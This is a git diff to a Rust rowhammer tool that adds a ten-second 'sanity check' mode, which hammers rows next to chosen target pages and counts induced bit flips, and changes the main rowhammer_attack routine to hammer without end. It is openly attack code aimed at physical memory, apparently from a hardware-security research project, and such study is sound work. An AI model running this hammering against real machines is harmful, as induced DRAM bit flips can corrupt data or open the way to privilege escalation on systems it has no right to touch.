@@ -6,7 +6,7 @@ use std::{
     path::Path,
     process::{self, Command},
     thread,
-    time::Duration,
+    time::{Duration, Instant},
 };
 
 use nix::{
@@ -20,9 +20,12 @@ use crate::profiler::{
     pagefinder::{get_candidate_pages, PageCandidate},
     utils::{
         self, collect_pages_by_row, fill_memory, get_block_by_order, get_page_frame_number,
-        rowhammer, setup_mapping,
+        rowhammer, setup_mapping, count_flips_by_bit,
     },
 };
+
+const TEST_ITERATIONS: u32 = 10;
+const INIT_PATTERN: u16 = 0x0;
 
 fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64, u64)), String> {
     let file = File::open(input_path).expect("Failed to open file.");
@@ -55,7 +58,54 @@ fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64,
     Err(String::from("Couldnt parse pfns from file"))
 }
 
-fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
+fn sanity_check_attack(pages: Vec<PageCandidate>) {
+    println!("Initializing pages for sanity check.");
+
+    for page in &pages {
+        unsafe {
+            fill_memory(
+                page.target_page.virt_addr,
+                page.above_pages.0.virt_addr,
+                page.below_pages.0.virt_addr,
+            );
+            fill_memory(
+                page.target_page.virt_addr,
+                page.above_pages.1.virt_addr,
+                page.below_pages.1.virt_addr,
+            );
+        }
+    }
+
+    let start = Instant::now();
+
+    loop {
+        for page in &pages {
+            rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
+        }
+
+        // Check if we've been running for set amount of time
+        if start.elapsed().as_secs() >= 10 {
+            break;
+        }
+    }
+
+    println!(
+        "Sanity check took {} ms",
+        start.elapsed().as_millis() as f64,
+    );
+
+    // Check flips in the victim pages
+    for page in &pages {
+        let (flips, flip_offsets) = count_flips_by_bit(&page.target_page, INIT_PATTERN);
+
+        println!(
+            "Page {:#x} had {:?} flips.\nWith offsets: {:?}",
+            page.target_page.pfn, flips, flip_offsets,
+        );
+    }
+}
+
+fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
     println!("Initializing pages for attack.");
 
     for page in &pages {
@@ -201,7 +251,7 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>, number_of_dummy_pag
                 }
             }
 
-            while hammer {
+            loop {
                 for page in &pages {
                     rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
                 }
@@ -290,7 +340,11 @@ pub(crate) fn main(
         }
     }
 
-    rowhammer_attack(hammer, victims, number_of_dummy_pages);
+    if hammer {
+        rowhammer_attack(victims, number_of_dummy_pages);
+    } else {
+        sanity_check_attack(victims);
+    }
 
     println!("Done with attack");
 }
